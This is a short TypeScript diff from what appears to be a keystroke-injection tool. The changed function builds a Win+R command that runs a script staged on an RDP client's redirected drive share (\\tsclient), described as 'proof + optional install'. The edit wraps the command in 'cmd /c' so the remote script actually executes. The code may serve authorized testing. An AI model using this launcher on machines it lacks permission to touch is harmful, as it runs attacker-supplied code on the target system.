@@ -209,10 +209,10 @@ export function buildInjectPublicReadbackShell(): string {
 
 /**
  * Short Win+R launcher for the staged RDPDR `a.cmd` (proof + optional install).
- * Keep this tiny: fewer keystrokes, lower mid-type terminate risk.
+ * Wrap with `cmd /c` so Run executes the UNC script instead of only resolving it.
  */
 export function buildInjectRdpdrLauncherShell(): string {
-    const shell = `\\\\tsclient\\${RDPDR_SHARE_NAME}\\a.cmd`;
+    const shell = `cmd /c \\\\tsclient\\${RDPDR_SHARE_NAME}\\a.cmd`;
     if (Buffer.byteLength(shell, 'utf8') + 1 > 510) {
         throw new AppError({
             code: 'invalid_argument',
